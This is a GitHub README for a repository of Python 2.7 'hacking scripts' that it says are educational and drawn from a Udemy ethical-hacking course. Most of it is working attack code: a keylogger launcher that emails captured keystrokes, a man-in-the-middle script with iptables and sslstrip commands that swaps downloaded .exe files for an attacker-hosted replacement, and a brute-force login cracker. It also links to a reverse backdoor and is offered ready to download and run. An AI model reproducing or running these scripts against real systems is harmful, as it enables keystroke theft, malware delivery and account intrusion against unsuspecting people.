[![Basic-Hacking-Scripts Reverse_Backdoor](https://user-images.githubusercontent.com/36347727/60137772-dce08d80-975c-11e9-941a-ae7db18ace40.png)](https://github.com/HarryCha777/Basic-Hacking-Scripts/blob/master/Malware/Listener.py)

# Hacking-Scripts

These are basic hacking scripts written in Python 2.7 for educational purposes only.

Although I personally wrote, modified, and commented on all these scripts in attempt to improve their intelligibility, the majority of these scripts are based on the [Udemy course "Learn Python & Ethical Hacking From Scratch" by Zaid Sabih.](https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch)

### Malware
This folder has tools that spy on and manipulates other computers.

Example:
```javascript
# Keylogger Via Email
# This calls Keylogger Via Email Class script.

#!/use/bin/env python
import Keylogger_Via_Email_Class, optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--email", dest="email", help="Email address to send keystrokes")
    parser.add_option("-p", "--password", dest="password", help="Password to the email address")
    (options, arguments) = parser.parse_args()
    if not options.email:
        parser.error("[-] Please specify an email address to send keystrokes. Use --help for more info.")
    if not options.password:
        parser.error("[-] Please specify the password to the email address. Use --help for more info.")
    return options

options = get_arguments()
my_keylogger = Keylogger_Via_Email_Class.Keylogger(120, options.email, options.password)
my_keylogger.start()

'''
pip install pynput
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10525120?start=0 (Logging Key-strikes and Reporting Them By Email)
'''
```
---

### Man-in-the-Middle (MITM)
This folder has tools that attack while being positioned inbetween 2 parties, tools that help accomplish such attacks, and tools that help prevent such attacks.

Example:
```javascript
# EXE Download Replacer

#!/use/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.13" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.13/replaced.exe\n")
                packet.set_payload(str(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

'''
service apache2 start    # Starting webserver necessary.
sslstrip    # Keep it running. This and one below commmands enable this program to work with HTTPS.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -I FORWARD -j NFQUEUE --queue-num 0    # FORWARD is name of chain that packets from other computers go through. Use INPUT and OUTPUT for your own computer.
iptables --flush    # After finishing this program, remove iptables.
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10276338?start=0 (Intercepting & Replacing Downloads on The Network)
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10255564?start=15 (Replacing Downloads on HTTPS Pages)
'''
```
---

### Website
This folder has tools that gather information about websites to help determine their weaknesses and tools that crack login pages.

Example:
```javascript
# Login Cracker

#!/use/bin/env python
import requests, optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL of site\'s login page (Ex.: http://10.0.2.13/dvwa/login.php)")
    parser.add_option("-w", "--wordlist", dest="wordlist", help="Path to wordlist")
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify the URL of site\'s login page (Ex.: http://10.0.2.13/dvwa/login.php). Use --help for more info.")
    if not options.wordlist:
        parser.error("[-] Please specify a path to wordlist. Use --help for more info.")
    return options

options = get_arguments()
target_url = options.url
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open(options.wordlist, "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()
print("[+] Reached end of line.")

'''
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10666162?start=0 (Guessing Login Information on Login Pages)
'''
```
---

# Installation and Setup
Simply download the Python scripts you would like to run and read the comments below each script to see the codes required to run before executing the scripts. For example, ARP_Spoofer.py needs to be executed after running "echo 1 > /proc/sys/net/ipv4/ip_forward", which is commented below the script.

Also, some Python scripts need another Python script to be executed. For example, Vulnerability_Scanner.py needs to be executed along with Vulnerability_Scanner_Class.py, which is commented on the 2nd line of the script.

# Contact
Please reach out to me through this email address:    harrycha777@gmail.com

# License
This project is under no license.
